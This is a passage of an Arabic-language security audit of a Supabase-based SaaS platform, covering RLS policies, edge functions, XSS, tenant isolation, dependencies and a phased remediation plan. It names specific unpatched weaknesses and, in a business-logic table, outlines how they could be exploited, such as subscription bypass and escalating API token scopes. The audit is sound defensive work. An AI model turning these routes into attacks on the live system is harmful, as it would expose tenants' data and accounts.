**L-04 · 19 جدولًا بـRLS بلا سياسات** — منها `internal_service_secrets`, `channel_secrets`, `oauth_clients`, `oauth_refresh_tokens`, `twofa_rate_limits`. السلوك مغلق (لا وصول إلا بـ`service_role`) وهو **الصحيح**، لكن غياب سياسة صريحة يجعل النية غير موثّقة وعرضة لأن «يُصلحها» أحد لاحقًا بسياسة مفتوحة.

**L-05 · حماية كلمات المرور المسرَّبة معطّلة** — خاصية Supabase Auth التي تقارن بـHaveIBeenPwned غير مفعّلة. تفعيلها نقرة واحدة.

**L-06 · نظافة القاعدة** — 9 دوال بـ`search_path` قابل للتغيير (`context_allows`, `context_destination`, `guard_owner_context_*`, `request_user_agent`, وغيرها)؛ وامتدادات `pg_net` و`http` و`btree_gist` في مخطط `public`. وجود `http`/`pg_net` في `public` جدير بالانتباه خاصةً: أي دالة `SECURITY DEFINER` بـ`search_path` مفتوح قد تصبح بوابة SSRF.

**L-07 · جلسة الزائر في `localStorage`** — `signInAsGuest()` تكتب كائنًا كامل الصلاحية العرضية بلا أي توقيع، و`resolveAccess` تقبله بـ`JSON.parse` وتعيد `AUTHORIZED`. **لا يمنح أي وصول للبيانات** (لا JWT، فكل نداء REST يمرّ كـ`anon`)، فالأثر عرضي بحت — لكنه يسمح بعرض واجهات غير مقصودة وقد يُبنى عليه خطأً لاحقًا.

**L-08 · 85 فهرسًا غير مستخدم + 3 مكرّرة** — (`bot_settings`, `oauth_refresh_tokens`, `sie_api_keys`). تكلفة كتابة وتخزين بلا فائدة.

**L-09 · تسجيل مطوَّل في الإنتاج** — `console.log('signIn function started')`, `console.log('Searching username:', …)`, وطباعة كائنات الخطأ الكاملة في `auth-client.js` و`login.html`. يسرّب تفاصيل تشغيلية في وحدة تحكم المتصفح.

**L-10 · ارتباط صلب بـ`.online`** — أهمها `oauth-discovery` حيث `issuer = "https://mad3oom.online"`. في OAuth الـissuer **هوية** لا مجرد عنوان: تغييره يُبطل كل موافقة وكل توكن مُصدَر سابقًا ويفرض على كل عميل MCP إعادة الاكتشاف والموافقة. وهي أصعب تبعية نطاق في المشروع. (يُلاحَظ أن `mcp/index.ts` و`oauth-authorize` نُقلا بالفعل إلى `PUBLIC_SITE_ORIGIN` من البيئة — عمل صحيح ونصف مكتمل، ويوثّقه `_PRODUCTION_SNAPSHOTS.md` كانحراف مقصود.)

**L-11 · ازدواج شجرة MCP** — `mcp/mcp.js` (103 KB) و`assets/js/admin/mcp.js` نسختان متوازيتان؛ و`mcp-arch` مكرّرة ثلاث مرات (`mcp/`، `mcp-invoke-tool/_shared/`، `test-mcp-server/_shared/`). أي إصلاح أمني يجب أن يُطبَّق ثلاث مرات — وهذا بالضبط ما حدث فعلًا في M-15.

**L-12 · بنية المستودع** — 42 ملف HTML في الجذر بلا خطوة بناء ولا تجزئة؛ و`supabase/functions/_rollback/`؛ وتسعة تقارير Markdown سابقة في الجذر. يصعّب على أي مراجع (أو أداة) معرفة ما هو حيّ.

**L-13 · `data-deletion.html` شبه فارغة** (715 بايت) رغم كونها مطلبًا في مراجعة تطبيق Meta وفي سياسات الخصوصية.

---

## Security Audit

### ما هو قويّ فعلًا (نقاط قوة مؤكَّدة)

راجعتُ هذه المواضع بحثًا عن ثغرات فلم أجد، وأسجّلها صراحةً لأن التقرير بلا إنصاف لا قيمة له:

| الموضع | لماذا هو صحيح |
|---|---|
| `oauth-token` | مصادقة العميل بمقارنة هاش ثابتة الزمن · PKCE S256 إلزامي ومُتحقَّق ثابت الزمن · الكود يُستهلك مرة واحدة (`used_at`) · تدوير refresh يُبطل التوكن القديم وصفّ `api_tokens` معه · `redirect_uri` و`client_id` يجب أن يطابقا الكود |
| `oauth-authorize` | `redirect_uri` يُطابَق على قائمة العميل المسجَّلة **قبل** أي 302 — لا open redirect · حد معدل 60/د/IP و20/د/عميل |
| `oauth-authorize-approve` | قرار المنح كله في `_shared/scope-grant.js` (وحدة واحدة تُنفَّذ في اختبارات Node) · الصلاحيات المرتفعة تُعرَض ولا تُقترَح، فمنحها يحتاج نقرة صريحة · النطاقات المطلوبة تُرشَّح على `ALLOWED_SCOPES` فلا يمكن توسيعها |
| `verify-2fa` | **ثغرة سابقة مُغلقة بشكل صحيح**: كان يقبل `tempSecret` من المنادي فيُتحقَّق من سرّ يملكه المهاجم؛ الآن السرّ المخزَّن هو الوحيد المقبول لأي مستخدم مُسجَّل، والهوية من `/auth/v1/user` لا من `sub` غير الموقَّع · خنق حقيقي (5 محاولات/10د، قفل 15د) |
| `pi-auth` | **ثغرة سابقة مُغلقة بشكل صحيح**: كانت كلمة المرور تُشتق حتميًّا من `pi_uid` العام؛ الآن لا كلمة مرور صالحة إطلاقًا، والجلسة عبر `magiclink + verifyOtp`، والهوية من `auth.users.user_metadata` لا من عمود يكتبه العميل |
| `check-dns-status` | **ثغرة سابقة مُغلقة**: كانت كتابة مجهولة تقلب حالة أي نطاق؛ الآن JWT + (أدمن أو مالك الصف)، وردّ 404 موحّد لعدم تأكيد وجود الصف |
| `sie-channel-telegram` | **ثغرة سابقة مُغلقة**: مسار GET كان مفتوحًا ويكشف حالة تشغيلية ويعيد تسجيل الـwebhook؛ الآن `isAdminCaller` قبل أي شيء · تبعيات SIE مثبّتة على SHA كامل |
| `create-api-token` · `create-sub-user` | التفويض يُقرَّر في القاعدة بنداء ذرّي واحد (`api_token_issue_context` / `sub_user_create_context`) ولا يُعاد بناؤه في TypeScript · كل معرّف هوية في الجسم يُتجاهَل صراحةً |
| `wa_wallet_charge_message` | `FOR UPDATE` ثم فحص الرصيد ثم التحديث داخل القفل — نمط صحيح تمامًا |
| `integrations-api` | فصل طبقات نظيف (core بلا شبكة، runtime للشبكة) · فحص رصيد قبل النداء الخارجي · خصم بعد قبول Meta · مفتاح مستقل عن مصادقة المنصة ويُرفض JWT صراحةً |
| `guard_profile_role_change` (نسخة 040) | يمنع تغيير رتبة النفس حتى للأدمن · أدوار الشركة مشتقّة من العلاقة ولا تُمنَح يدويًا · `platform_owner` للمالك وحده |
| بنية السلطة (038–041) | `platform_authority` كصفّ لا كعنوان · `owner_capability()` تشترط الملكية **و** سماح السياق **و** العلاقة · `guard_preview_read_only` يجعل معاينة عضو الشركة للقراءة فقط على 9 جداول |
| بوابة الحساب (042) | سياسات RESTRICTIVE تُدمج بـAND فوق 17 جدولًا بلا تعديل سياسة واحدة قائمة — تصميم ممتاز وقابل للتراجع |

---

## Authentication & Authorization

**المعمارية.** Supabase Auth (GoTrue) + جدول `profiles` للرتبة + `platform_authority` للسلطة + سياق قابل للتبديل لمالك المنصة. الفصل بين النطاقات الثلاثة (طاقم المنصة / أدوار الشركة / `emp_ops`) مفروض في القاعدة **ومُختبَر** في `tests/access-policy.test.mjs` الذي يقارن جدول القدرات في الواجهة بـ`context_allows()` في القاعدة ويفشل إن افترقا. هذه ممارسة نادرة وممتازة.

**الثغرات:**
- العامل الثاني ليس عاملًا في المصادقة أصلًا (H-01).
- `verify-otp` بلا مصادقة وبلا خنق (H-02).
- الحظر غير منفَّذ (H-04).
- البريد ما زال سلطةً في مواضع حسّاسة (H-10).

**الانتحال (Impersonation).** `?impersonate=<uuid>` في `auth-client.js:600-627` — الفحص الفعلي `canImpersonate()` يقع في **نقطة التنفيذ** لا في إخفاء الزر، ومقصور على `admin` (لا `support`) ومالك المنصة داخل سياق `admin`. **صحيح.** ونقطة مهمة: الانتحال **عرضي بحت** — الجلسة تبقى جلسة الأدمن وكل استعلام يمرّ بـRLS الأدمن، فلا يُصدَر توكن باسم الضحية. هذا تصميم آمن.

**إدارة الجلسة.** التوكنات في `localStorage` (افتراض supabase-js). مقبول لتطبيق صفحة واحدة، لكنه يجعل **أي** XSS استيلاءً كاملًا على الحساب — وهو ما يرفع C-06 من «XSS» إلى «استيلاء على الإدارة». `logout()` يستدعي `signOut({scope:'global'})` ثم ينظّف المفاتيح يدويًا مع مهلة — معالجة جيدة لحالة `navigator.locks` العالقة.

---

## RLS & Database Security

- **160 جدولًا في `public`، كلها `rowsecurity = true`.** لا جدول مكشوف.
- لا جدول بـ`FORCE ROW LEVEL SECURITY` — غير ضروري هنا لأن المالك هو `postgres` ولا تُنفَّذ استعلامات المستخدمين به.
- **سياسات `qual = true`:** `chatbot_memory` (SELECT للدور `public`، أي `anon`) — الجدول يحوي `user_message` و`admin_reply`، أي محتوى محادثات حقيقي. **الجدول فارغ اليوم (0 صف)، فالتصنيف Potential لا Confirmed**، لكن السياسة نفسها خاطئة ويجب إغلاقها قبل أن يُملأ. وبقية سياسات `true` مقصودة ومقبولة (كتالوجات، منتدى عام، صفحة حالة الخدمة، `landing_config`، `subscription_plans`).
- **`WITH CHECK` غائب في سياسات UPDATE كثيرة** — Postgres يعيد استخدام `USING` فلا ينشأ خرق مباشر، لكنه يعني أن **الأعمدة** لا تُقيَّد إطلاقًا. هذا هو الجذر البنيوي المشترك لـC-02 وC-03 وM-02 وM-11: RLS تحرس **الصفوف** لا الأعمدة، والمشروع يعتمد على المحفّزات لحراسة الأعمدة — وأهم تلك المحفّزات غير منشور.
- **`SECURITY DEFINER` قابلة للتنفيذ من `anon`:** 59 دالة. فحصتُ الخطرة منها فرديًّا:
  - `sie_admin_set_access` · `sie_admin_reset_usage` → محميّتان بـ`is_sie_admin()` ✅
  - `sie_consume_message` → تردّ `unauthorized` للمجهول ✅ (**false positive** في القراءة السطحية)
  - `wa_set_integration_billing_method` → محميّة بـ`is_whatsapp_billing_admin()` ✅
  - `get_ai_usage_summary` → `WHERE … AND public.is_admin()` ✅
  - `sie_rate_limit_hit` → **غير محميّة عمليًّا** ⇒ M-05
  - `get_email_by_username` / `get_email_by_phone` → مخنوقة لكنها تكشف بريدًا ⇒ M-04
  - البقية محفّزات (`log_*`, `notify_*`, `trg_badges_*`, `handle_new_user`) — نداؤها مباشرةً يرفع خطأ «trigger functions can only be called as triggers»، فالخطر نظري. لكن `REVOKE EXECUTE … FROM anon, authenticated` عليها نظافة مستحقّة (وقد بدأها الترحيل 022 لبعضها ولم يُكمِلها).
- **194 دالة `SECURITY DEFINER` قابلة للتنفيذ من `authenticated`** — لم أراجعها فرديًّا كلها؛ راجعت من بينها كل ما يمسّ المال والصلاحيات والاشتراكات (انظر Areas Not Fully Verified).

---

## API & Edge Functions

| الدالة | مصادقة | تعدد المستأجرين | الحكم |
|---|---|---|---|
| `mcp` | مفتاح API + نطاق | `getVisibleUserIds` عبر `super_user_id` | سليم بنيويًّا — لكن الارتفاع عبر البريد في `actor.ts` (H-10) وسقف النطاق قابل للتجاوز (C-03) |
| `mcp-invoke-tool` · `test-mcp-server` · `mcp-oauth-start` | JWT + `is_admin()` + `owner_id` | صحيح | سليم |
| `send-whatsapp` | مفتاح API + `whatsapp:send` | `resolveIntegration` مقيَّد بـ`user_id` ✅ | بلا فوترة (H-03) وبلا تسجيل استخدام (M-15) |
| `create-api-token` · `create-sub-user` | JWT + RPC بوابة | صحيح | **مثال يُحتذى** |
| `oauth-*` | حسب الـRFC | — | قويّ، عدا تبعية issuer (L-10) |
| `verify-2fa` · `generate-2fa-secret` · `disable-2fa` | JWT + خنق | — | سليم |
| `verify-otp` | **بلا** | — | H-02 |
| `huggingface-chatbot` | **بلا** | — | H-07 |
| `meta-webhook` | HMAC يفشل مفتوحًا | بلا عمود مالك | H-06 |
| `check-subdomain-status` | بلا (بالتصميم) | — | M-03 |
| `accounting-sync` | `x-sync-secret` يفشل مغلقًا ✅ | — | سليم (L-02 فقط) |
| `pi-auth` | توكن Pi يُتحقَّق منه لدى Pi | — | سليم أمنيًّا (M-16 أداء) |
| `sie-channel-telegram` | secret_token لتيليجرام · GET للأدمن | `user_id` من `channel_identities` | سليم |
| `landing-contact` | بلا (نموذج عام) + مصيدة + حد لكل بريد | — | مقبول |
| `gemini-proxy` (منشورة فقط) | JWT — و`userId` من الجسم | **مكسور** | C-07 |
| `integrations-api` (منشورة فقط) | مفتاح تكامل مستقل | صحيح | سليم (M-08) |
| 17 دالة منشورة أخرى | — | — | **غير مُراجَعة** |

**CORS.** كلها `*`. تصنيف: Informational (L-01).
**SSRF.** لم أجد مسارًا يقبل عنوانًا من مستخدم غير موثوق. المواضع التي تنادي عناوين خارجية تفعل ذلك على عنوان خزّنه المالك بنفسه (`test-integration-connection`) أو على `full_domain` مشتقّ من صفّ في القاعدة (`check-dns-status`). **لا ثغرة SSRF مؤكَّدة** — لكن وجود `pg_net`/`http` في `public` (L-06) يستحق مراقبة.
**SQL Injection.** كل الوصول عبر PostgREST/supabase-js أو دوال بمعاملات مُربَطة. لم أجد أي تركيب نصّي لاستعلام SQL. **لا ثغرة.** (ملاحظة مجاورة: `error-service.js:24` و`manage-subdomain` المنشورة تبنيان مُرشِّح PostgREST بـ`.or(\`…%${q}%\`)` من نصّ المنادي — وهي حَقْن في **قواعد المُرشِّح** لا في SQL؛ الأثر هنا مقصور على أدمن يوسّع استعلامه على بيانات يراها أصلًا، فتصنيفها Low.)

---

## Frontend Security

**النموذج المعلَن صحيح.** `assets/js/page-guard.js` يذكر حرفيًا: «ده حارس **عرض**. الحماية الحقيقية للبيانات في RLS ودوال SECURITY DEFINER، ولا تعتمد على أي شيء هنا». وهذا هو الموقف الصحيح، والمشروع ملتزم به فعلًا: لم أجد قرارًا أمنيًّا يعتمد على الواجهة وحدها **باستثناء** 2FA (H-01) والحظر (H-04) — وكلاهما مُسجَّل أعلاه.

**XSS.**
- **مؤكَّدة:** C-06 (`admin/errors.html` — `err.status`).
- **محميّة بشكل جيد:** المنتدى — DOMPurify عند الكتابة **وعند العرض** (`forum.js:486, 557`)، و`sanitizeUrl()` يرفض `javascript:`، وكل الحقول النصية عبر `escapeHtml`. (تحذير: المحفّز `forum_content_sanitization` **لا ينقّي HTML** رغم اسمه — ينقّي الألفاظ فقط. فالحماية كلها في DOMPurify، ومن هنا أهمية تحديثه — M-10.)
- **محميّة:** `admin/inbox.js` (`esc()` في كل موضع و`renderBody` يهرب قبل التلوين)، `assets/js/admin/tickets.js`، `mailbox.js`، `mcp.js`.
- **مخاطر ذاتية فقط (Self‑XSS، لا تُصنَّف ثغرة):** `assets/js/admin/auth.js:42` و`settings.js:1590` و`manage-subdomains.html:1225` — `<img src="${url}">` بقيم يملكها المستخدم نفسه ويراها وحده.
- **غير مراجَع بالكامل:** 86 ملف HTML، بعضها ضخم جدًا (`index.html` 124 KB، `api-docs.html` 99 KB، `board.html` 80 KB، `leads.html` 74 KB). مسحتُ نمط `innerHTML` مع الاستيفاء عبر المشروع كله وتتبّعت النتائج ذات القيمة، لكن مراجعة سطرًا بسطر لكل ملف لم تقع.

**التخزين المحلي.** المفاتيح: `sb-*` (توكنات)، `theme-preference`، `mad3oom-guest-session` (L-07)، `device_fingerprint`، `userWallet`، `chat_user_id`، `admin_id`، `lastLoginTime`. **لا أسرار مخزَّنة** غير توكنات Supabase نفسها. `device_fingerprint` معرّف UUID عشوائي يولّده العميل ويُستعمل في `trusted_devices` — وبما أن الجهاز الموثوق يتخطّى 2FA، فإن تحكّم العميل الكامل في البصمة يضعف الميزة أكثر (متفرّع من H-01).

**تجاوز الواجهة.** كل زر أو حقل مخفيّ في الواجهة قابل للتجاوز بنداء مباشر — وهذا مفترض في التصميم. المواضع التي **تفشل** فيها الطبقة الخلفية عند التجاوز هي بالضبط C-01، C-02، C-03، H-05، M-02، M-11.

---

## Multi‑Tenant Isolation

**نموذج العزل.** ثلاث آليات متوازية:
1. `super_user_id` على `profiles` + `supervises()` — النموذج الأقدم.
2. `companies` + `company_members()` + `current_company_id()` — نموذج 035.
3. `platform_authority` + سياق — سلطة المنصة.

**ملاحظة معمارية:** MCP (`authz.ts:getVisibleUserIds`) ما زال يستعمل النموذج الأول (`super_user_id`) بينما القاعدة انتقلت إلى الثاني. النموذجان متطابقان اليوم لأن `sync_company_role` يشتق الدور من `super_user_id`، لكنهما مصدرا حقيقة منفصلان — وأول انحراف بينهما يصير ثغرة عزل صامتة. **توصية:** وحّدهما على `company_of()`.

**خروقات العزل المؤكَّدة:**
- **C-07** — `gemini-proxy`: قراءة اسم وتذاكر أي مستخدم.
- **C-04** — التخزين العام: مرفقات كل المستأجرين مقروءة للعالم.
- **H-06** — `meta-webhook`: تحديث `whatsapp_templates` بالاسم بلا عمود مالك.
- **H-03** — كل المستأجرين يرسلون عبر توكن Meta واحد للمنصة.

**ما فُحص ووُجد سليمًا:** `resolveIntegration` (مقيَّد بـ`user_id`)، `mcp-invoke-tool` (`ownerId` من الـJWT دائمًا)، `notifications-service.sendNotification` (مقيَّد بـ`getVisibleUserIds`)، `customers-service.getCustomer` (`canAccessCustomer`)، سياسات `companies` (`current_company_id()`)، `whatsapp-graph-request` (`.eq("user_id", userId)`).

---

## Business Logic

فكّرتُ في هذا القسم كمستخدم خبيث لا كمطوّر، وتتبّعت كل مسار إلى نهايته:

| الهدف الخبيث | ممكن؟ | الطريق |
|---|---|---|
| **تجاوز الاشتراك** | ✅ **نعم** | C-01 — إدراج `status='active'` مباشرة. وC-02 — `whatsapp_enabled=true`. طريقان مستقلان |
| **تجاوز الصلاحيات** | ✅ **نعم** | C-03 — رفع نطاقات مفتاح API إلى `admin:full`. وC-06 — XSS يسرق جلسة أدمن |
| **التلاعب بالرصيد** | ⚠️ **جزئيًا** | لا سكّ نقود مباشر (`wa_wallet_adjust` للطاقم، وحارس `guard_profile_points_change` مطبَّق). لكن **الإنفاق بلا خصم** ممكن تمامًا (H-03)، وهو نفس الأثر الاقتصادي |
| **إرسال رسائل بدون خصم صحيح** | ✅ **نعم** | H-03 — `send-whatsapp` و MCP لا يمرّان بالمحفظة إطلاقًا |
| **تكرار العمليات** | ⚠️ | لا مفتاح تكرار (idempotency key) على مسار الإرسال؛ ودَحْض التكرار في قناة تيليجرام `createMemoryDeduplicator` **في الذاكرة** فلا يعيش عبر عزلات الدالة ⇒ خصم مزدوج أو رسالة مزدوجة عند إعادة محاولة تيليجرام |
| **الوصول لبيانات عميل آخر** | ✅ **نعم** | C-07 (تذاكر واسم) · C-04 (مرفقات) |
| **الوصول لبيانات شركة أخرى** | ⚠️ | سياسات الشركة سليمة؛ الخرق يأتي من C-04 و C-07 لا من سياسات الشركة نفسها |
| **تجاوز حدود الاستخدام** | ✅ **نعم** | M-01 (سباق + fail‑open) · M-05 (IP من المنادي) · H-02 (محاولات OTP) |
| **استدعاء APIs بطريقة غير متوقَّعة** | ✅ **نعم** | C-07 و H-02 (`userId` من الجسم) · C-05 (رفع بلا مصادقة) |
| **التلاعب بالـ IDs والمعاملات** | ✅ **نعم** | C-07 · H-05 (`author_id`) · M-11 (`status`) |
| **تنفيذ عمليات تمنعها الواجهة** | ✅ **نعم** | C-01 · C-02 · C-03 · M-02 |
| **ترقية النفس إلى admin** | ❌ **لا** | `guard_profile_role_change` مطبَّق ويمنع تغيير رتبة النفس حتى للأدمن. **حاجز صحيح** |
| **ضمّ النفس لشركة أخرى** | ❌ **لا** | `check_super_user_creation` يمنع تغيير `super_user_id` لغير الإدارة العليا. **حاجز صحيح** |
| **انتحال هوية في المحتوى** | ✅ **نعم** | H-05 |

---

## Reliability

- **Race conditions:** M-07 (المحفظة المركزية) · M-01 (حد المعدل) · M-12 (خصم بعد إرسال ناجح) · `wa_wallet_check_sufficient` ثم `charge` غير ذرّيتَين معًا (لكن `charge` تعيد الفحص تحت القفل فلا يهبط الرصيد سالبًا — النتيجة إرسال بلا خصم لا رصيد سالب).
- **Idempotency:** غائبة على مسار إرسال WhatsApp؛ ودَحْض تكرار تيليجرام في الذاكرة فقط. `oauth-token` يعالج التكرار بشكل صحيح (`used_at` على الكود). `check-dns-status` يمنع الإشعار المكرّر بشرط `status='propagating'` داخل الـUPDATE نفسه — **نمط صحيح يستحق التعميم**.
- **Timeouts:** `withTimeout` مطبَّق باتساق جيد في `auth-client.js` و`login.html` (10ث/8ث/6ث). `integrations-api` يضع مهلة صريحة 15ث على Graph. `check-dns-status` يضع 6ث. **جيد.**
- **Partial failures:** `create-sub-user` يتراجع بحذف المستخدم إن فشل إكمال الملف — تعويض صحيح. `pi-auth` يرفض إصدار جلسة إن فشل تدوير الاعتماد — فشل مغلق صحيح.
- **ابتلاع الأخطاء:** `manage_user_points` و`transfer_points_from_central` تلتقطان `WHEN OTHERS` وتعيدان `success:false` — تخفي الأخطاء الحقيقية وتصعّب التشخيص. و`logApiUsage` و`logMessage` fire‑and‑forget بلا `await` فقد تُفقَد السجلات عند انتهاء العزلة.
- **الاسترجاع:** لا آلية تعويض لأي خصم فاشل ولا طابور إعادة محاولة. `webhook_deliveries` موجود لكنه خارج مسار الفوترة.

---

## Performance

من مستشار أداء Supabase على المشروع الحيّ:

| البند | العدد | الأثر |
|---|---|---|
| `auth_rls_initplan` | **180** | كل سياسة تعيد تقييم `auth.uid()` لكل صف — أثقل عنق زجاجة في القاعدة |
| `multiple_permissive_policies` | **261** | كل سياسة مسموحة إضافية تُقيَّم لكل صف لنفس الدور والفعل |
| `unindexed_foreign_keys` | **108** | مسح كامل عند الحذف والانضمام |
| `unused_index` | **85** | تكلفة كتابة وتخزين بلا عائد |
| `duplicate_index` | **3** | `bot_settings`, `oauth_refresh_tokens`, `sie_api_keys` |

**في الكود:**
- `pi-auth` يستدعي `listUsers` حتى 50 مرة لكل عملية دخول (M-16).
- `mcp/index.ts` ينادي `getToolsCatalog()` و`getDisabledToolNames()` في كل طلب بلا تخزين مؤقت، ويُنشئ عميل Supabase جديدًا في كل نداء (`db()` في كل دالة خدمة).
- `verifyApiToken` يعمل استعلام عدّ على `api_token_usage_logs` في كل طلب.
- الواجهة: `index.html` 124 KB و`api-docs.html` 99 KB و`mcp/mcp.js` 103 KB و`customer-dashboard.js` 128 KB — بلا تجزئة ولا تصغير ولا خطوة بناء. أول تحميل ثقيل على شبكة محمولة.
- `logo.png` **1 ميجابايت** في الجذر.

---

## Dependencies

```json
{ "dependencies": { "xlsx": "^0.18.5" },
  "devDependencies": { "playwright": "^1.49.1" } }
```

| الاعتمادية | النسخة | الملاحظة |
|---|---|---|
| `xlsx` | 0.18.5 | **ثغرة تلوث prototype معروفة**؛ الإصلاح في 0.19.3+. وحزمة npm مهجورة لصالح توزيع SheetJS الرسمي |
| `dompurify` | 3.1.6 (CDN) | قديمة — وهي **الحاجز الوحيد أمام XSS المنتدى**. راجع نشرات 3.2.x وحدّث |
| `jspdf` / `jspdf-autotable` | 2.5.1 / 3.5.28 (CDN) | قديمة؛ تستحق مراجعة النشرات |
| `chart.js` | **بلا نسخة** | يُجلب «الأحدث» دائمًا — كسر محتمل وسطح توريد مفتوح |
| `@supabase/supabase-js` | `@2` (major عائم) | يتحرّك مع كل إصدار minor/patch |
| `deno.land/std` | 0.177.0 | قديمة جدًا (`meta-webhook`) |
| `esm.sh` / `jsr:` / `npm:` | مختلطة | ثلاث آليات استيراد مختلفة عبر الدوال — بلا خريطة استيراد موحّدة |
| SIE modules | `@8252e577…` | **مثبّتة على SHA كامل — ممارسة صحيحة تمامًا** |
| `https://wa.mad3oom.com/…js` | — | استيراد كود تطبيق من أصل آخر وقت التشغيل |

**صفر `integrity=`** في المشروع كله.

**توصية:** ثبّت كل نسخة CDN بدقة + أضف SRI؛ أو الأفضل: استضف الاعتماديات محليًّا وأضف خطوة بناء بسيطة. رقّ `xlsx` أو استبدله. فعّل Dependabot/Renovate — الملفّ `.github/workflows/` فيه CodeQL واختبارات ولا فحص اعتماديات.

---

## Architecture

**نقاط قوة معمارية حقيقية:**
- القرار الأمني مركزيّ في القاعدة، والواجهة تعلن صراحةً أنها غير موثوقة.
- دوال بوابة ذرّية (`api_token_issue_context`, `sub_user_create_context`) تمنع تكرار شرط التفويض بلغتين — وهو أذكى قرار معماري في المشروع.
- ترحيلات موثَّقة بمستوى استثنائي: كل ملف يشرح الجذر والدليل والأثر والتراجع، وكثير منها يحمل كتلة `do $$ … raise exception` للتحقق الذاتي.
- اختبار يقارن جدول قدرات الواجهة بدالة القاعدة ويفشل عند الافتراق.
- فصل الطبقات في `integrations-api` (core بلا شبكة → قابل للاختبار).

**نقاط ضعف معمارية:**
1. **لا آلية تتبّع للترحيلات.** مجلد `migrations/` يدوي بلا جدول تتبّع ولا تكامل مع `supabase db push`. هذا هو **السبب الجذري** لـC-01 وC-02 وC-04 وH-04 معًا. إصلاح واحد يغلق أربع ثغرات حرجة.
2. **الكود المنشور ليس مصدر الحقيقة.** 19 دالة بلا مصدر.
3. **نموذجا عزل متوازيان** (`super_user_id` مقابل `company_members`).
4. **ثلاث نسخ من `mcp-arch`** ونسختان من `api-auth.ts` (انحرفتا فعلًا) ونسختان من واجهة MCP.
5. **لا خطوة بناء ولا تجزئة** — 42 HTML في الجذر، ملفات JS بمئة كيلوبايت.
6. **نقاط فشل مفردة:** توكن Meta واحد للمنصة كلها (H-03)؛ و`issuer` OAuth مربوط بنطاق واحد (L-10)؛ ومشروع Supabase واحد يحمل `public` + `emp_ops` + SIE + workflow engine + المنتدى + المجتمع.
7. **مخططات متعددة داخل مشروع واحد** (`public`, `emp_ops`, `storage`, `auth`) — `emp_ops` لم يدخل نطاق هذه المراجعة إطلاقًا.

---

## Code Quality

- **كود ميت:** `turnstile-config.js` (صفر استيراد، ويحمل سرًّا)، `ai-probe-temp`، `supabase/functions/_rollback/`، تسعة تقارير Markdown سابقة في الجذر، `nkczmzq8sv7cbrav95s9e9p9xd43o0.html`.
- **ازدواج المنطق:** `api-auth.ts` ×2 (منحرفتان)، `mcp-arch` ×3، واجهة MCP ×2، `whatsapp-service.ts` ×2.
- **قيم مثبّتة:** `MAIN_ADMIN_EMAILS`, `ALLOWED_SENDERS`, `ROOT_DOMAIN`, `issuer`, `CONSENT_PAGE_URL`, `gate_is_exempt_account` — كلها على `.online`.
- **أنماط غير متسقة:** ثلاث آليات استيراد في Deno (`jsr:`, `npm:`, `esm.sh`, `deno.land`)؛ ودوال تستعمل `createClient` وأخرى `fetch` خامًا على REST؛ ورسائل خطأ بالعربية والإنجليزية مختلطة.
- **معالجة أخطاء ضعيفة:** `EXCEPTION WHEN OTHERS` يبتلع كل شيء في دالتَي النقاط؛ و`.catch(() => {})` صامت في مواضع عدة؛ وfire‑and‑forget بلا `await` على السجلات.
- **التسمية مضلِّلة أحيانًا:** `forum_content_sanitization` لا ينقّي HTML؛ `Users can toggle active state of their own tokens` لا تقتصر على `is_active`؛ `Allow authenticated users to upload` لا تشترط المصادقة.
- **نقاط قوة:** التعليقات العربية في الترحيلات وثائق معمارية حقيقية لا حشو؛ التحقق الذاتي داخل الترحيلات؛ وحزمة اختبارات SQL/RLS حقيقية تعمل في CI على Postgres فعلي.

---

## Recommended Remediation Plan

### Phase 1 — Critical (فورًا، قبل أي إنتاج)

| # | الإجراء | الطبقة | الملف/الموضع |
|---|---|---|---|
| 1 | **احذف `gemini-proxy` من لوحة Supabase** | نشر | C-07 — أرخص إصلاح وأعلى أثر |
| 2 | اهرب `err.status` في لوحة الأخطاء + `CHECK` على العمود + قيّده في سياسة الإدراج | Frontend + DB | C-06 |
| 3 | طبّق `migrations/023` | DB | C-01 |
| 4 | طبّق `migrations/027` §2 (حارس أعمدة الملف) | DB | C-02 |
| 5 | أضف `auth.uid() is not null` + نطاق مسار إلى سياسة رفع `chat-attachments`، واضبط حدود الحجم والنوع | Storage | C-05 |
| 6 | محفّز يمنع تعديل `scopes` وما يتبعها على `api_tokens` | DB | C-03 |
| 7 | طبّق `028` ثم `030` بالترتيب الموصوف (سياسات → عمود `file_path` → كود التوقيع → قلب المستودع) | DB + Storage + Frontend | C-04 |
| 8 | دوّر مفتاح Turnstile السري واحذفه من الكود | أسرار | H-08 |
| 9 | راجع بيانات ما بعد الاستغلال: اشتراكات `active` بلا `reviewed_by`، مفاتيح تحمل `admin:full`، صفوف `profiles` بـ`whatsapp_enabled=true` بلا اشتراك مقابل | تدقيق | — |

### Phase 2 — High

| # | الإجراء | الملاحظة |
|---|---|---|
| 10 | أعد بناء 2FA ليكون شرطًا على إصدار الجلسة (Supabase MFA أو نمط `pi-auth`) | H-01 |
| 11 | أصلح `verify-otp`: JWT + فحص المحاولات قبل المطابقة + حد لكل IP | H-02 |
| 12 | وحّد مسارات إرسال WhatsApp على `whatsapp-dispatcher` (فحص رصيد + خصم + توكن المستأجر) | H-03 |
| 13 | اربط `is_banned()` ببوابة `account_is_active()` + استعمل `auth.users.banned_until` | H-04 |
| 14 | `WITH CHECK (author_id = auth.uid())` على المنتدى والمجتمع (5 سياسات) | H-05 |
| 15 | اقلب `meta-webhook` إلى fail‑closed + مقارنة ثابتة الزمن + ربط بمالك | H-06 |
| 16 | احذف `huggingface-chatbot` أو اشترط JWT + حدًّا | H-07 |
| 17 | **أضف بوابة CI تتحقق من تطابق الإنتاج مع المستودع** (دوال + كائنات ترحيل) | H-09 — يمنع تكرار السبب الجذري |
| 18 | أنزل مصادر الـ19 دالة إلى المستودع أو احذف الميت منها | H-09 |
| 19 | انزع البريد كسلطة من الـ10 مواضع المتبقية | H-10 |

### Phase 3 — Medium

